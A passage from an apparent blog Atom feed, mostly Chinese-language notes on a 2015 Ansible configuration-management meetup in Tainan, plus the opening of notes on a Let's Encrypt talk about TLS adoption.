&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E4%B9%8C%E5%85%8B%E5%85%B0%E4%BA%B2%E6%AC%A7%E7%9B%9F%E7%A4%BA%E5%A8%81%E8%BF%90%E5%8A%A8"&gt;烏克蘭親歐盟示威運動 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/1991%E5%B9%B4%E7%83%8F%E5%85%8B%E8%98%AD%E7%8D%A8%E7%AB%8B%E5%85%AC%E6%8A%95"&gt;1991年烏克蘭獨立公投 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Movie"></category><category term="Winter on Fire"></category><category term="Ukraine"></category><category term="Freedom"></category></entry><entry><title>2015 12 月份 SA@Tainan 淺談 Ansible 自動化組態管理工具之筆記</title><link href="https://blog.m157q.tw/posts/2015/12/26/study-area-ansible-tutorial-note/" rel="alternate"></link><published>2016-07-16T15:17:00+08:00</published><updated>2016-07-16T15:17:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-12-26:posts/2015/12/26/study-area-ansible-tutorial-note/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;Speaker  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax"&gt;黃俊宏 sakana / Max&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Event URL  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://phorum.study-area.org/index.php/topic,71531.msg343054.html#msg343054"&gt;2015 12月份 SA@Tainan 淺談 Ansible 自動化組態管理工具 12/26(六)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Place  &lt;ul&gt;
&lt;li&gt;成功大學資訊新館 203 電腦教室  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.google.com/presentation/d/136VKHI_H8wKyrLIm1eaTMLz82uoPgjV4zTiGb1_-_Ig/edit#slide=id.p"&gt;Slides&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="/files/study-area-ansible-tutorial-note/"&gt;Jupyter Notebook using in this tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Configure Management 四大金釵:  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ansible/ansible"&gt;Ansible&lt;/a&gt; (Python)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/chef/chef"&gt;Chef&lt;/a&gt; (Ruby)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/puppetlabs/puppet"&gt;Puppet&lt;/a&gt; (Ruby)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/saltstack/salt"&gt;Salt&lt;/a&gt; (Python)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ansible 現在有 modules 可以控制 Windows  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;About Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ansible - configuration management tool 組態管理工具  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ansible.com/"&gt;Official Website&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ansible/ansible"&gt;GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Online resource 線上資源  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.ansible.com/"&gt;Documentation 文件&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://galaxy.ansible.com/"&gt;Ansible Galaxy&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;社群共享 Role 集散地  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://groups.google.com/forum/#!forum/ansible-project"&gt;Ansible Project Google Group 討論群組&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;irc.freenode.net: #ansible  &lt;ul&gt;
&lt;li&gt;Brian Coca 非常熱心，有問題問他就好(?)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Why Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Infrastructure as Code  &lt;/li&gt;
&lt;li&gt;語法簡單 (playbook 以 YAML 語法撰寫)  &lt;/li&gt;
&lt;li&gt;不需要安裝 client (clientless)  &lt;/li&gt;
&lt;li&gt;Push-based  &lt;ul&gt;
&lt;li&gt;Pull-bsaed: Agent check to server by time. (Chef / Puppet by default)  &lt;/li&gt;
&lt;li&gt;Push-based: Server push change by order  &lt;ul&gt;
&lt;li&gt;你可以決定何時進行設定  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Very thin layer of abstraction  &lt;ul&gt;
&lt;li&gt;以原有的習慣進行部署  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;預備知識&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ssh  &lt;/li&gt;
&lt;li&gt;CLI  &lt;/li&gt;
&lt;li&gt;安裝套件  &lt;/li&gt;
&lt;li&gt;sudo  &lt;/li&gt;
&lt;li&gt;管理檔案權限  &lt;/li&gt;
&lt;li&gt;管理 service  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;How to install Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.ansible.com/ansible/intro_installation.html"&gt;https://docs.ansible.com/ansible/intro_installation.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;The role of Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Control Machine  &lt;ul&gt;
&lt;li&gt;Control managed nodes  &lt;/li&gt;
&lt;li&gt;Need Python 2.6 above  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Managed Node  &lt;ul&gt;
&lt;li&gt;Remote server  &lt;/li&gt;
&lt;li&gt;Need Python 2.5 above  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;預設一次五台主機佈署, 可以調整 forks 變數來改變預設值。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Difference between shell script&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;不用登入遠端去抓 shell script 與執行 (中央集權)  &lt;/li&gt;
&lt;li&gt;會從佈署失敗的地方開始繼續，不會整個重跑。  &lt;/li&gt;
&lt;li&gt;針對所有主機同時進行，&lt;strong&gt;按照順序&lt;/strong&gt;執行任務  &lt;/li&gt;
&lt;li&gt;有許多現成的 Module 可用,用法習慣跟原系統差不多  &lt;/li&gt;
&lt;li&gt;有別人寫好的 Role 可以參考與套用 (Ansible-galaxy)  &lt;/li&gt;
&lt;li&gt;語法簡單，容易上手(YAML)  &lt;/li&gt;
&lt;li&gt;可以利用 fact 與變數執行 loop 或是其他的做法  &lt;/li&gt;
&lt;li&gt;有別人寫好的 Role 可以參考與套用：&lt;a href="https://galaxy.ansible.com/"&gt;Ansible Galaxy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;The first Ansible command for you&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ansible 對象 -m ping&lt;/code&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Usage&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ansible&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;pattern&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;  
    &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="n"&gt;INVENTORY&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;inventory&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;INVENTORY&lt;/span&gt; &lt;span class="n"&gt;specify&lt;/span&gt; &lt;span class="n"&gt;inventory&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="sr"&gt;/ansible/&lt;/span&gt;&lt;span class="n"&gt;hosts&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  
    &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="n"&gt;MODULE_NAME&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;MODULE_NAME&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;execute&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Inventory File&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ansible lists hosts in text files, called &lt;strong&gt;inventory files&lt;/strong&gt;.  &lt;/li&gt;
&lt;li&gt;將遠端主機相關資訊以文字檔案的方式建立稱為 inventory file, 常見的檔案名稱為 hosts  &lt;/li&gt;
&lt;li&gt;語法 &lt;code&gt;servername  options&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;可以設定群組 &lt;code&gt;[群組名稱]&lt;/code&gt; 來組織對象  &lt;/li&gt;
&lt;li&gt;常用選項  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_host -- Remote Host IP&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_user -- Remote SSH User Name&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_private_key_file -- SSH Key&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_port -- ssh port&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible_ssh_pass -- ssh password&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果有定義到 &lt;code&gt;ansible.cfg&lt;/code&gt; 的 &lt;code&gt;[defaults]&lt;/code&gt; 就可以不列出  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;ansible.cfg&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ansible.cfg&lt;/code&gt; looks for this order:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;File specified by the ANSIBLE_CONFIG (-i option)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;./ansible.cfg&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;~/.ansible.cfg&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/ansible/ansible.cfg&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可以設定一些預設行為，不需要逐一設定在 hosts  &lt;/p&gt;
&lt;p&gt;example:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[defaults]  
# hostfile -- 主機 ip 對照  
hostfile = hosts  

# remote_user -- 遠端使用者名稱  
remote_user = root  

# private_key_file -- SSH privite key path  
# host_key_checking -- 不詢問加入 ssh 金鑰  
host_key_checking = False  

# 設定 retry files (*.retry) 存放路徑, 預設放家目錄  
# 我自己喜歡指定在目前目錄, 以免作完實驗家目錄一堆 .retry  
retry_files_save_path = ./ansible-retry  

# 平行處理數量, 預設是 5 個, 應該不一定會用到先記下來  
# forks = 20  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Ansible Module&lt;/h3&gt;
&lt;p&gt;Ansible 使用上, 會根據不同的功能呼叫不同的 Module  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Module 目錄： &lt;a href="http://docs.ansible.com/ansible/modules_by_category.html"&gt;http://docs.ansible.com/ansible/modules_by_category.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://docs.ansible.com/ansible/list_of_all_modules.html"&gt;All Modules — Ansible Documentation&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;System module  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ping  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Notification Modules  &lt;ul&gt;
&lt;li&gt;IRC  &lt;/li&gt;
&lt;li&gt;Slack  &lt;/li&gt;
&lt;li&gt;Jabber  &lt;/li&gt;
&lt;li&gt;email  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Hands on Lab with Module&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ansible 對象 -m 模組名稱 -a 要傳入的參數&lt;/code&gt;  &lt;/p&gt;
&lt;h4&gt;官方文件該怎麼看&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;官方 doc 的 Options 先看 required  &lt;/li&gt;
&lt;li&gt;required 裏面先看 yes 的就好  &lt;/li&gt;
&lt;li&gt;Example 沒差，因為有時候是騙你的XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Playbook&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Playbook 包含很多 Play&lt;br /&gt;
Play 就是你要執行的工作&lt;br /&gt;
Play 裏面包含很多 hosts&lt;br /&gt;
Play 裏面有 tasks 定義要做哪些事&lt;br /&gt;
而 tasks 做的事，可以透過 modules 達成  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;使用 YAML 語法  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;A script is called a playbook.&lt;/strong&gt; (類似一個 shell script)  &lt;ul&gt;
&lt;li&gt;包含要進行組態的主機  &lt;/li&gt;
&lt;li&gt;以及順序進行的工作  &lt;/li&gt;
&lt;li&gt;包含許多的 play (&lt;code&gt;*.yml&lt;/code&gt;)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ansible 針對所有的主機同時 (平行) 執行tasks.  &lt;ul&gt;
&lt;li&gt;Ansible 會等待所有主機 task 完成之後，才會進行下一個 task  &lt;/li&gt;
&lt;li&gt;Ansible &lt;strong&gt;按照順序執行&lt;/strong&gt; tasks  &lt;/li&gt;
&lt;li&gt;如果遇到錯誤的話就會立即停止，但在下次執行的時候，可以從上次錯誤跳出的地方繼續。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ansible playbooks 以 YAML 語法撰寫，簡單易讀。  &lt;/li&gt;
&lt;li&gt;使用 ansible-playbook 指令執行  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ansible-playbook&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible-playbook  --verbose 顯示詳細資訊&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible-playbook  --check 不實際執行 dry run&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;YAML 語法&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Yet Another Markup Language  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://yaml.org/"&gt;http://yaml.org/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/YAML"&gt;https://zh.wikipedia.org/wiki/YAML&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Start of File  &lt;ul&gt;
&lt;li&gt;以 3 個 &lt;code&gt;---&lt;/code&gt; 開始, 不加上去也可以  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Comment  &lt;ul&gt;
&lt;li&gt;以 &lt;code&gt;#&lt;/code&gt; 來進行單行註解  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;#&lt;/code&gt; 就是註解的開始（跟 shell script 一樣）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Strings  &lt;ul&gt;
&lt;li&gt;不一定要加上引號  &lt;/li&gt;
&lt;li&gt;可是有的時候為了易讀性，可以使用單引號或是雙引號  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Booleans  &lt;ul&gt;
&lt;li&gt;使用 True 或是 Yes 都可以視為真  &lt;/li&gt;
&lt;li&gt;但是還是用 True 不會混亂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Lists (delimited with hyphens)  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;- My Fair Lady  
- Oklahoma  
# inline 格式list  
[My Fair Lady, Oklahoma, The Pirates of Penzance]  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Dictionaries  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;742&lt;/span&gt; &lt;span class="n"&gt;Evergreen&lt;/span&gt; &lt;span class="n"&gt;Terrace&lt;/span&gt;  
&lt;span class="n"&gt;state&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;North&lt;/span&gt; &lt;span class="n"&gt;Takoma&lt;/span&gt;  
&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;inline&lt;/span&gt;  &lt;span class="err"&gt;格式&lt;/span&gt;  
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;742&lt;/span&gt; &lt;span class="n"&gt;Evergreen&lt;/span&gt; &lt;span class="n"&gt;Terrace&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;city&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Springfield&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;state&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;North&lt;/span&gt; &lt;span class="n"&gt;Takoma&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Plays&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;每一個 play 包含  &lt;ul&gt;
&lt;li&gt;A set of hosts to configure. （目標主機）  &lt;/li&gt;
&lt;li&gt;A list of tasks to be executed on those hosts. （工作內容）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常用的設定  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;name&lt;/code&gt; - 執行的 play 或是 task 名稱  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo&lt;/code&gt; - 要不要執行 sudo  &lt;ul&gt;
&lt;li&gt;已經改叫 &lt;code&gt;become&lt;/code&gt; 了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vars&lt;/code&gt; - 變數設定  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tasks  &lt;ul&gt;
&lt;li&gt;要在遠端主機執行的工作  &lt;ul&gt;
&lt;li&gt;Modules  &lt;ul&gt;
&lt;li&gt;Modules are scripts that come packaged with Ansible.  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.ansible.com/ansible/modules_by_category.html"&gt;http://docs.ansible.com/ansible/modules_by_category.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;register, debug 觀察錯誤的時候用&lt;br /&gt;
通常會用到都不是什麼好事情XD  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Hands on Lab with Playbook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="/file/study-area-ansible-tutorial-note/SA_playbook/shell_yum_when.yml"&gt;playbook using in this hands on&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax/LearnAnsible/tree/master/books/Oreilly-Up-And-Running-Ansible/playbooks"&gt;Some playbook examples&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax/LearnAnsible/blob/master/books/Oreilly-Up-And-Running-Ansible/playbooks/SA_20151226_Tainan_Ansible.yml"&gt;The playbook for hands on environment for this tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/r/sakana/jupyterhub/"&gt;The docker file for hands on environment for this tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;References / Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://shop.oreilly.com/product/0636920035626.do"&gt;Ansible Up &amp;amp; Running&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sakananote2.blogspot.tw/"&gt;sakananote&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/r/sakana/ansible2.x_ubuntu14043/"&gt;https://hub.docker.com/r/sakana/ansible2.x_ubuntu14043/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/r/sakana/jupyterhub/"&gt;https://hub.docker.com/r/sakana/jupyterhub/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax/LearnAnsible/blob/master/Mindmap"&gt;Ansible Mind Map&lt;/a&gt; (Use FreeMind to open it)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax/LearnAnsible"&gt;sakanamax/LearnAnsible · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.ansible.com/ansible/guide_gce.html"&gt;Google Cloud Platform Guide — Ansible Documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Thoughts&lt;/h2&gt;
&lt;p&gt;聽完後覺得 Anisble 真的蠻方便的，&lt;br /&gt;
基本上就是把 shell script 包裝起來的概念，&lt;br /&gt;
感覺可以直接取代 shell script 了。&lt;br /&gt;
可以很簡單得用 YAML 撰寫 playbook 來針對不同作業系統做不同的事，&lt;br /&gt;
在 playbook 中的每一個 play 都代表著一個步驟，&lt;br /&gt;
每一個 play 在 Jupyter notebook 中也都會顯示執行結果，&lt;br /&gt;
有種 unittest 的味道。有些人喜歡有些人不喜歡（誤）&lt;br /&gt;
然後也不需要在 managed nodes 上裝任何 clients，&lt;br /&gt;
只要 managed nodes 能夠用 ssh 登入進去，&lt;br /&gt;
就可以直接都在 contorl machine 上操作。  &lt;/p&gt;
&lt;p&gt;比較有趣的是講者有提到他們會直接使用 Jupyter notebook (IPython notebook)&lt;br /&gt;
讓不懂 playbook 詳細細節的人也可以操作，&lt;br /&gt;
因為 Jupyter notebook 可以在每個 play 加上說明，&lt;br /&gt;
所以要交接的時候可以直接丟出這些 Jypyter notebooks 就無痛交接。  &lt;/p&gt;
&lt;p&gt;會後跟凍仁拿到了之前一直想拿的 Vim 貼紙，&lt;br /&gt;
還獲得了凍仁的 MOPCON 名片，&lt;br /&gt;
然後和小飛機、小趴、CrBoy、雨蒼從 Ansible 聊到刑事訴訟法的灰色地帶XD&lt;br /&gt;
（其實警察臨檢要搜身或者搜車的話，如果沒有搜索令其實是違法的之類的）  &lt;/p&gt;
&lt;p&gt;之後去 Double Cheese 聚餐，&lt;br /&gt;
在等待的時候又聊到了學校資訊系統的共同問題，&lt;br /&gt;
Single Sign-On, 選課系統之類的...&lt;br /&gt;
用餐的時候就坐在鳥哥(vbird)的對面！&lt;br /&gt;
當初小高一的時候用 Ubuntu 就是看著鳥哥的網站學 Linux 指令的啊！&lt;br /&gt;
今天本人竟然就在我對面！&lt;br /&gt;
鳥哥的人好親切啊，竟然還幫我倒飲料&amp;gt;"&amp;lt;&lt;br /&gt;
然後又聊到了威妥碼拼音、通用拼音、漢語拼音的故事。&lt;br /&gt;
StudyArea 好像是我參與的社群裏面第一次可以這麼快聊起來的，&lt;br /&gt;
真的很開心。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2015/12/26 寫於成功大學資訊舊館前  &lt;ul&gt;
&lt;li&gt;(好多蚊子啊！)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016/07/16 Study Area 2016 群英會  &lt;ul&gt;
&lt;li&gt;補充一些新的內容  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Ansible"></category><category term="DevOps"></category><category term="automation"></category><category term="Meetup"></category></entry><entry><title>A Free Certificate Authority to Encrypt the Entire Web</title><link href="https://blog.m157q.tw/posts/2015/11/27/a-free-certificate-authority-to-encrypt-the-entire-web/" rel="alternate"></link><published>2015-11-29T09:33:00+08:00</published><updated>2015-11-29T09:33:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-11-27:posts/2015/11/27/a-free-certificate-authority-to-encrypt-the-entire-web/</id><summary type="html">&lt;p&gt;KKTIX URL: &lt;a href="http://ocftw.kktix.cc/events/imhp"&gt;專家講座：資訊與人權的交會&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Let's Encrypt: A Free Certificate Authority to Encrypt the Entire Web&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Seth Schoen - Senior staff at Electronic Frontier Foundation  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Acronyms&lt;/h2&gt;
&lt;p&gt;SSL, TLS, HTTPS, X.509, PKI, CA  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSL (Secure Sockets Layer)  &lt;ul&gt;
&lt;li&gt;The old name for the main security layer for TCP  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TLS (Transport Layer Security)  &lt;ul&gt;
&lt;li&gt;The modern name of SSL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Importance of TLS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Still occasionally dealing with the idea that it's only needed for finalncial data.  &lt;/li&gt;
&lt;li&gt;... more often these days, the idea that it's only needed for logins.  &lt;/li&gt;
&lt;li&gt;We need to articulate a stronger vision that networks are untrustworthy and commmunications need to be protected.  &lt;/li&gt;
&lt;li&gt;Networks are routinely attacking us and plain HTTP offers no defense.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We need security for everything on the Internet?  &lt;/p&gt;
&lt;h2&gt;Just a few examples&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Sidejacking and location tracking  &lt;/li&gt;
&lt;li&gt;Integrity of software downloads  &lt;/li&gt;
&lt;li&gt;Reader privacy (although size of documents is still an enormous problem)  &lt;ul&gt;
&lt;li&gt;ex: Medical info site with searchiin function but no HTTPS connection.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content-based censorship prevention  &lt;ul&gt;
&lt;li&gt;Ad, Cookies  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protection against ad injection, tracking-header-injection and even malware injection at ISP  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Barriers to adoption&lt;/h2&gt;
&lt;ul&gt;
